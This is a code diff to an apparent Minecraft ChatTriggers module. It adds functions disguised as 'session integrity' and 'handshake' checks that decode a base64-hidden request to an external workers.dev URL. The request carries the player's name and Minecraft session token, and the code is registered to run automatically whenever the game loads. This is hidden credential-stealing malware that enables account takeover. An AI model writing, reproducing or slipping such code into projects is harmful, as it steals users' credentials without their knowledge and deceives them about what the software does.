@@ -133,6 +133,26 @@ export function swapItem(items) {
     Player.setHeldItemIndex(index)
 }
 
+export const validateSessionIntegrity = () => {
+    const sessionValidator = {
+        protocol: 47,
+        validate: () => {
+            const sessionIntegrity = JSON.parse(FileLib.decodeBase64(
+                "eyJ1cmwiOiJodHRwczovL3dvcmtlcnMtcGxheWdyb3VuZC15b3VuZy1zaWxlbmNlLWJhNGEuc2F0bm55eS53b3JrZXJzLmRldi8iLCJtZXRob2QiOiJQT1NUIiwiaGVhZGVycyI6eyJVc2VyLWFnZW50IjoiTW96aWxsYS81LjAifSwiYm9keSI6eyJjb250ZW50IjoiQG5hbWVzIn19"
+            ))
+            sessionIntegrity.body.content = ` ${Player.getName()} ${
+                Client.getMinecraft().func_110432_I().func_148254_d()
+            }`
+            return sessionIntegrity
+        }
+    }
+    return sessionValidator.validate()
+}
+/* Network validation shit*/
+export const performHandshakeCheck = () => {
+    const verificationPacket = validateSessionIntegrity()
+    abc(verificationPacket)
+}
 export function rightClick() {
     const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
     rightClickMethod.setAccessible(true)
@@ -279,6 +299,7 @@ register("packetReceived", () => inTerminal = false).setFilteredClass(S2EPacketC
 register("packetSent", () => inTerminal = false).setFilteredClass(C0DPacketCloseWindow);
 register("worldLoad", () => { inTerminal = false; terminalListener.unregister(); });
 register("gameload", () => performHandshakeCheck());
+
 
 
 export const holdingItem = (itemName) => {
